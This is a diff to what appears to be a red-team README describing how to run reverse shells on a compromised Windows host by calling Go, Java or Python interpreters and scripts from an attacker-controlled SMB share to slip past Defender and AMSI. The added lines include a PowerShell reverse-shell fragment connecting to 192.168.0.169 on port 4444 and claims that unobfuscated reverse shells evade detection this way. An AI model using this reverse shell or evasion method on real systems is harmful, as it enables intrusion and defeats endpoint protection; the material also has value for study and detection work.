@@ -3,7 +3,7 @@
 
 This is my collection of ways to Execute Code in a number of different Programming Languages on a Victim Windows Host which doesnt have the environment installed.
 
-Running an .exe from a remote share is nothing new, but what I havent seen is this technique documented anywhere. As long as you have the right environment installed on your Attacker Controlled Windows Device you can essentially run any code you wish in memory. 
+This is nothing ground breaking, but I havent seen this technique documented anywhere. As long as you have the right environment installed on your Attacker Controlled Windows Device you can essentially run any code you wish in memory. 
 
 More will be added as and when I have the time to research it.
 
@@ -21,16 +21,17 @@ Post exploitation Techniques
 
 ## Set the Scene
 
-Lets say you have command execution on a host, your going to want to run a command to return a reverse shell. I would normally for something like powershell -c "......." 
+Lets say you have command execution on a host, your going to want to run a command to return a reverse shell. I would normally for something like `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.169',4444);........" `
 
-Now with this aproach we have AMSI and Defender/AV. Assuming our victim can reach out over SMB, it is possible to copy files and execute or just execute an .exe straight from the share.
+Now with this aproach we have AMSI and Defender/AV. Running something like this without an AMSI bypass or obfuscation will get killed. Assuming our victim can reach out over SMB, we could either copy files over and execute or just execute an .exe straight from the share which is nothing new.
 
-This approach does that but what we can do is call the .exe of our programming language of choice and also pass it a script, both of which are stored on our attacker controlled SMB share. Defender still scans the scripts but by utilising **Go, Java, PHP etc** we have more flexibility to bypass static signatures.
+This approach does that but what we can do is call the .exe of our programming language of choice and also pass it a script, both of which are stored on our attacker controlled SMB share. Defender still scans the scripts but by utilising **Go, Java, PHP etc** we have more flexibility to bypass static signatures. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
 
-You can also utilise these programming languages to carry out post exploitation in weird and wonderful ways. Hell, just call python.exe from the rmeote share and drop straight into the [Interpreter](#python-interpreter-example). 
+You can also utilise these programming languages to carry out post exploitation in weird and wonderful ways. You could even just call python.exe from the remote share and drop straight into the [Interpreter](#python-interpreter-example). 
 
+The process is extremely simple.
 
-## <a name="Go"></a>The process is extremely simple - Example with Go
+## <a name="Go"></a>Example with Go
 
 1. Have a Windows Victim where you can run commands
 2. Have a Windows Attack Box with your Programming Environment of choice - Python Java and Go are the only ones I have tested so far
